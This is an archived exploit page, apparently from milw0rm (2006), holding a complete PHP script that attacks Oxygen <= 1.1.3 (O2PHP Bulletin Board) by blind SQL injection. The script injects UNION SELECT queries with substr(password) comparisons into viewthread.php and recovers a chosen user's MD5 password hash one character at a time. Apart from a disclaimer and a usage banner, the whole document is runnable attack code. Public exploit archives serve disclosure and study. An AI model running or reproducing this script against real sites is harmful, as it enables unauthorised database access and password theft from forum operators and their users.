<html><head><title>Oxygen <= 1.1.3 (O2PHP Bulletin Board) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php
&lt;?

if($argc&lt;4){
 print(&quot;
 -------------------------------------------------------
 Affected.scr..: Oxygen &lt;= 1.1.3 (O2PHP Bulletin Board)
 Poc.ID........: 14061118
 Type..........: SQL Injection
 Risk.level....: Medium
 Conditions....: register_globals = on
 Src.download..: download.o2php.com
 Poc.link......: acid-root.new.fr/poc/14061118.txt
 Credits.......: DarkFig
 Note..........: FOR EDUCATIONAL PURPOSE ONLY
 -------------------------------------------------------
 Usage.........: php 14061118.txt &lt;host&gt; &lt;path&gt; &lt;userid&gt;
 -------------------------------------------------------\n&quot;);
 exit(1);
}

print &quot;\n Please be patient (max=736 hits)...\n MD5: &quot;;
$host = !preg_match(&quot;/^http:\/\/(\S*)/&quot;,$argv[1],$hwttp) ? $argv[1] : $hwttp[1];
$path = $argv[2];
$usid = intval($argv[3]);
$tabl = &quot;o2_members&quot;;

for($x=1;  $x&lt;=32; $x++) {
for($y=48; $y&lt;=71; $y++) {

$recv  = '';
$sqli  = &quot;%20UNION%20SELECT%201,1%20FROM%20&quot;.$tabl.&quot;%20WHERE%20uid=&quot;.$usid.&quot;%20AND%20substr(password,&quot;.$x.&quot;,1)=char(&quot;.$y.&quot;)%23&quot;;
$data  = &quot;GET &quot;.$path.&quot;viewthread.php?tid=1&amp;pid=-1&quot;.$sqli.&quot; HTTP/1.1 \r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;Connection: Close\r\n\r\n&quot;;

if(!$sock  = @fsockopen($host, 80)) die(&quot;Connection problem\n&quot;);
fputs($sock, $data);

while(!feof($sock)) $recv .= fgets($sock);
fclose($sock);

if(preg_match(&quot;/Location: viewthread.php/&quot;, $recv)) {
  print strtolower(chr($y));
  break;
} elseif($y == 71) {
  print &quot;Not vulnerable\n&quot;;
  exit(1);

}}}

print &quot;\n&quot;;
exit(0);

?&gt;

# milw0rm.com [2006-11-18]</pre></html>